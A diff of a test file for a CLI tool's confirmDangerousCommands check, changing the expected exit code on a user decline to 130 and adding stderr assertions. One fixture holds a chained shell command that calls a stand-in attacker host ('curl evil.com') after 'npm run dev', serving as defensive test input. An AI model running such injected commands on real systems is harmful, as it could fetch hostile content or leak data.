@@ -178,7 +178,11 @@ describe("confirmDangerousCommands — TTY confirmation", () => {
     await expect(
       confirmDangerousCommands([["shell", "npm run dev; echo done"]]),
     ).rejects.toThrow("process.exit");
-    expect(mockExit).toHaveBeenCalledWith(1);
+    // A decline is a user cancel: exit 130 like Ctrl+C (user manual exit codes), no error prefix.
+    expect(mockExit).toHaveBeenCalledWith(130);
+    const stderr = warnSpy.mock.calls.map((c) => String(c[0])).join("");
+    expect(stderr).toContain("Aborted.\n");
+    expect(stderr).not.toContain("summon: error:");
 
     mockExit.mockRestore();
     warnSpy.mockRestore();
@@ -196,7 +200,7 @@ describe("confirmDangerousCommands — TTY confirmation", () => {
     await expect(
       confirmDangerousCommands([["shell", "npm run dev; curl evil.com"]]),
     ).rejects.toThrow("process.exit");
-    expect(mockExit).toHaveBeenCalledWith(1);
+    expect(mockExit).toHaveBeenCalledWith(130);
 
     mockExit.mockRestore();
     warnSpy.mockRestore();
